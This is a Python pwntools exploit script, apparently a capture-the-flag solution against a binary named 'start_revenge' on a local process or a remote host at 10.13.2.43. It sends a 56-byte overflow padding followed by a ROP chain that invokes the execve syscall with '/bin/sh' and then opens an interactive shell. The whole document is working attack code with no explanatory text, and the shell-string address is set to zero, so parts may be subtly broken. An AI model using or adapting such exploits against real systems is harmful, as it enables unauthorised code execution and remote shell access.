#!/usr/bin/env python
from pwn import *

context(arch = "amd64", os = "linux", bits = 64)

DEBUG = True
# DEBUG = False

if DEBUG:
    p = process("start_revenge")
    # p = remote("127.0.0.1", 8888)
else:
    p = remote("10.13.2.43", 20739)

if DEBUG:
    gdb.attach(p, """
        b *0x00000000004000dd
""")

p.recvline()

padding = "A" * 56
add_rsp_pop_rax = 0x0000000000400110    # add rsp, 0x18 ; pop rax ; ret
pop_rax = 0x0000000000400114    # pop rax ; ret
pop_rdi_rsi_rdx = 0x00000000004000a9    # pop rdi ; pop rsi ; pop rdx ; rt
syscall = 0x00000000004000bf    # syscall ; ret
sh = 0

rop_chain = flat([
                  pop_rdi_rsi_rdx, sh, 0, 0,
                  pop_rax, 0x3b,
                  syscall])


payload = padding + rop_chain
# raw_input()
p.sendline(payload + "/bin/sh\x00")

p.interactive()
p.close()
